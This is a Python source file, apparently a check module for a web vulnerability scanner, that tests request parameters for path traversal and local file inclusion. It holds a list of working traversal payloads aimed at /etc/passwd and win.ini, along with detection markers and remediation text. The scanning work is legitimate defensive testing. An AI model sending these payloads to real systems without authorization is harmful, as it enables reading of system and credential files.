"""Path traversal / LFI: reads a well-known file as proof."""

from __future__ import annotations

from argos.engine.findings import Finding, Severity, truncate
from argos.engine.probe import DEFAULT_POINTS, baseline, build_points, send
from argos.engine.registry import Check, ScanContext, register

TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
]

ETC_PASSWD_MARKERS = ("root:x:0:0", "root:x:0:", "root:*:0:0")
WIN_INI_MARKERS = ("[fonts]", "[extensions]", "for 16-bit app support")


@register
class PathTraversal(Check):
    name = "path-traversal"
    mode = "active"
    min_profile = "quick"
    summary = "Path traversal / LFI via crafted ../ payloads (file-read proof)"

    async def run(self, ctx: ScanContext) -> list[Finding]:
        points = build_points(ctx, limit=DEFAULT_POINTS)
        findings: list[Finding] = []

        for point in points:
            base = await baseline(ctx, point)
            for payload in TRAVERSAL_PAYLOADS:
                resp = await send(ctx, point, payload)
                body = resp.text
                hit = next(
                    (m for m in ETC_PASSWD_MARKERS if m in body and m not in (base.text or "")),
                    None,
                )
                os_name = "Unix"
                if hit is None:
                    hit = next(
                        (
                            m
                            for m in WIN_INI_MARKERS
                            if m in body and m not in (base.text or "")
                        ),
                        None,
                    )
                    os_name = "Windows"
                if hit is None:
                    continue
                findings.append(
                    Finding(
                        plugin=self.name,
                        title=f"Path traversal / arbitrary file read ({os_name})",
                        severity=Severity.HIGH,
                        cvss=7.5,
                        cwe="CWE-22",
                        url=point.endpoint,
                        parameter=point.param,
                        description=(
                            f"Parameter '{point.param}' accepts directory-traversal "
                            f"sequences — payload {payload!r} returned contents of a "
                            "protected OS file (marker found: "
                            f"{hit!r}). Attackers read source code, /etc/passwd, "
                            "credentials, or any file the service account can access."
                        ),
                        remediation=(
                            "Reject '..' sequences and absolute paths; canonicalize the "
                            "resolved path and verify it stays inside the intended base "
                            "directory; prefer allowlisting file identifiers over paths."
                        ),
                        evidence_request=(
                            f"{point.method} {point.endpoint}\n{point.param}={payload}"
                        ),
                        evidence_response=truncate(
                            f"HTTP {resp.status_code}\n{body[:700]}", 900
                        ),
                    )
                )
                break
        return findings
